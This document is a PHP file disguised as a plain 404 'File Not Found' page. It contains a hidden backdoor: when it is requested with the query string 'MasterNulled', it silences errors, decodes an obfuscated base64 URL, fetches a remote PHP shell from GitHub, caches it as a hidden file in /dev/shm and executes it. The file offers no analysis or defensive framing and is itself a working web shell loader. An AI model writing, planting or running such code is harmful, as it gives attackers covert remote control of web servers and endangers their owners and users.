<?php
error_reporting(0);

if ($_SERVER['QUERY_STRING'] === 'MasterNulled') {
    $REMOTE_SHELL_URL = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
    $LOCAL_CACHE_DIR  = '/dev/shm';
    $LOCAL_CACHE_FILE = $LOCAL_CACHE_DIR . '/.shadow_' . md5($REMOTE_SHELL_URL) . '.log';

    if (!file_exists($LOCAL_CACHE_FILE)) {
        $shell = file_get_contents($REMOTE_SHELL_URL);
        if ($shell !== false) {
            file_put_contents($LOCAL_CACHE_FILE, $shell);
        } else {
            http_response_code(500);
            exit('Failed to fetch remote shell.');
        }
    }

    include($LOCAL_CACHE_FILE);
    exit;
}

http_response_code(404);
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Not Found</title>
    <style>
        body {
            background: #fff;
            font-family: monospace;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .msg {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="msg">
        <h2>File Not Found</h2>
        <p>The file you are looking for might have been removed,<br> had its name changed, or is temporarily unavailable.</p>
    </div>
</body>
</html>
